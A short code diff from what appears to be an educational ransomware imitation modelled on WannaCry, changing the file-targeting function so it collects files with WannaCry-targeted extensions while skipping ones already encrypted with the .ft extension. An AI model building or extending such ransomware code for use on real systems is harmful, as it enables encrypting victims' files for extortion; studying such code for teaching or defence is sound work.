@@ -35,11 +35,13 @@ KEY_FILE = os.path.join(SCRIPT_DIR, "stockholm.key")
 
 
 def get_files(directory):
-    """Get all files matching WannaCry extensions."""
+    """Get all files matching WannaCry extensions, skipping already encrypted .ft files."""
     targets = []
     try:
         for root, _, files in os.walk(directory):
             for filename in files:
+                if filename.endswith(FT_EXTENSION):
+                    continue
                 _, ext = os.path.splitext(filename)
                 if ext.lower() in WANNACRY_EXTENSIONS:
                     targets.append(os.path.join(root, filename))
